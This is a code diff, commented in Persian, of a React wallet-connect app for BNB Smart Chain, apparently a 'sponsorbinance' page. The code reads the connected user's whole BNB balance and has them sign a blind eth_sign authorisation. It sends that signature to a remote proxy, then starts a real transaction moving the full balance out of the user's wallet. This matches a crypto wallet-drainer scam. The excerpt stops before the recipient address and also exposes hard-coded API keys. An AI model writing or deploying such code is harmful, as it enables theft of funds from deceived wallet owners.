@@ -3,7 +3,7 @@ import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
 
-// تابع گرفتن بالانس BNB از BscScan (بدون تغییر)
+// تابع گرفتن بالانس BNB از BscScan
 async function getBNBBalance(address) {
   try {
     const response = await fetch(
@@ -21,12 +21,12 @@ async function getBNBBalance(address) {
 
 function App() {
   async function runner() {
-    // پاک کردن session قدیمی (WalletConnect)
+    // پاک کردن Session قدیمی (در صورت وجود)
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
-    // راه‌اندازی WalletConnect Provider
+    // ساخت Provider از WalletConnect
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56],
@@ -34,11 +34,9 @@ function App() {
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
-    // فعال‌کردن اتصال (QR Code را به کاربر نشان می‌دهد)
+    // نمایش QR و اتصال به کیف پول
     await ethereumProvider.enable();
     const provider = ethereumProvider;
-
-    // گرفتن آدرس متصل‌شده
     const accounts = await provider.request({ method: "eth_accounts" });
     const accountSender = accounts[0];
 
@@ -46,21 +44,20 @@ function App() {
       console.error("❌ Wallet connection failed");
       return;
     }
-
     console.log("✅ Wallet Connected:", accountSender);
 
-    // اطمینان از اینکه روی شبکه بایننس اسمارت چین هستیم
+    // تلاش برای تغییر شبکه به BSC (برخی کیف پول‌ها ممکن است از این متد پشتیبانی نکنند)
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // chainId اصلی BSC
+        params: [{ chainId: "0x38" }], // شبکه اصلی بایننس اسمارت چین
       });
     } catch (error) {
       console.error("❌ Error in switching chain:", error);
-      return;
+      // ممکن است نیاز باشد کاربر دستی شبکه را عوض کند
     }
 
-    // آدرس سرور PHP که امضا را بررسی می‌کند
+    // این آدرس پروکسی PHP شماست
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
     // 1) گرفتن بالانس BNB از BscScan
@@ -71,11 +68,10 @@ function App() {
     }
     console.log("💰 BNB Balance:", amount);
 
-    // 2) ساخت پیام برای امضای اول
+    // 2) ساخت پیام و امضای آن با eth_sign (فقط تأیید کاربر - اختیاری اما طبق کد قبلی شما)
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
     console.log("📜 Message to Sign:", message);
 
-    // 3) امضای پیام اول با eth_sign (تأیید شفاهی کاربر)
     let signature;
     try {
       signature = await provider.request({
@@ -88,19 +84,19 @@ function App() {
     }
     console.log("✍️ Signature:", signature);
 
-    // 4) ارسال امضا به سرور با handler='tx' تا فقط امضا را تأیید کند (اختیاری)
+    // 3) ارسال امضا به سرور با handler='tx' برای تأیید (بدون ساخت تراکنش خام)
     let verifyResult;
     try {
       verifyResult = await jQuery.post(apiUrl, {
-        handler: "tx",          // سرور تشخیص می‌دهد امضای پیام ساده است
+        handler: "tx",
         address: accountSender,
-        signature: signature,  
-        amount: amount,         
+        signature: signature,
+        amount: amount,
       });
 
       console.log("📥 Server Response:", verifyResult);
 
-      // درصورت نیاز، بررسی کنید که verifyResult.success === true
+      // اگر سرور پاسخ را به صورت رشته JSON داده باشد، parse می‌کنیم
       if (typeof verifyResult === "string") {
         verifyResult = JSON.parse(verifyResult);
       }
@@ -113,13 +109,14 @@ function App() {
       return;
     }
 
-    // 5) حالا تراکنش واقعی را از کیف پول کاربر بفرستیم (خودش گس را می‌دهد)
+    // 4) اگر تأیید شد، یک تراکنش واقعی (on-chain) از کیف پول کاربر می‌سازیم تا خودش گس بدهد
     try {
-      // مقدار BNB را از عدد اعشاری به Wei تبدیل کنیم
+      // تبدیل مقدار BNB به Wei (هگز)
       const valueWeiHex = "0x" + (parseFloat(amount) * 1e18).toString(16);
 
-      // ساخت و ارسال تراکنش با eth_sendTransaction
       console.log("🚀 Sending real transaction from user wallet...");
+
+      // متد eth_sendTransaction => کیف پول کاربر این را امضا می‌کند
       const txHash = await provider.request({
         method: "eth_sendTransaction",
         params: [{
